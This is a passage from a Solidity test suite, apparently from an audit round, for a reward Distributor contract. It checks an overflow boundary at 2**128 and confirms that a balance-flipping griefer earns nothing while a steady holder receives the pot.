        assertLe(total, 100e18, "the swing created value");
    }

    /// `_arm`'s `total * MAGNITUDE` is the overflow boundary, and it sits above the accumulator
    /// cliff round 1 already documented, so it is not a new cliff.
    function test_R2_08e_sound_theArmOverflowBoundaryIsAtTwoToThe128() public {
        Distributor d = _mk(18, 1, 1, 1, address(0), address(0));
        d.setBalance(alice, 1e33);

        uint256 justUnder = (2 ** 128) - 1;
        _pair(d).mint(address(d), justUnder);
        d.distribute(justUnder); // must not revert
        assertGt(d.streamRate(), 0, "the boundary case did not arm");

        Distributor e = _mk(18, 1, 1, 1, address(0), address(0));
        e.setBalance(alice, 1e33);
        _pair(e).mint(address(e), 2 ** 128);
        vm.expectRevert();
        e.distribute(2 ** 128);
    }

    /// The whole point, restated end to end on the fixed clock: hold across the window and you get
    /// the pot; hold for zero blocks and you get nothing.
    function test_R2_08f_sound_holdingIsTheOnlyWayToBePaid() public {
        Distributor d = _mk();
        d.setBalance(alice, 500e18); // honest, present throughout
        d.setBalance(griefer, 500e18); // in and out around the sweep

        _give(d, 100e18);
        d.setBalance(griefer, 0);

        _tick(uint256(d.STREAM_WINDOW()) + 1);
        assertEq(d.withdrawableOf(griefer), 0, "the flipper was paid");
        assertApproxEqRel(d.withdrawableOf(alice), 100e18, 1e12, "the holder was not paid the pot");
    }
}
